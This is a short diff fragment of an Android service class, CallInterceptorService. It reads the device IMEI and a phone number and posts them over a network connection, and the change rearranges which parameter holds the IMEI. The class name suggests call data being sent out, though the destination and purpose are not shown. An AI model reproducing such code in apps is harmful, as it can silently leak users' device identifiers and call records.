@@ -219,9 +219,10 @@ public class CallInterceptorService extends Service {
         TelephonyManager mngr = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
         String imei = mngr.getDeviceId();
         List<NameValuePair> params = new ArrayList<NameValuePair>();
-        params.add(new BasicNameValuePair("param1", "12312"));
+        params.add(new BasicNameValuePair("param1", imei
+        ));
         params.add(new BasicNameValuePair("param2", phoneNumber));
-        params.add(new BasicNameValuePair("param3", imei));
+        params.add(new BasicNameValuePair("param3", "715275712312"));
 
         OutputStream os = conn.getOutputStream();
         BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, "UTF-8"));
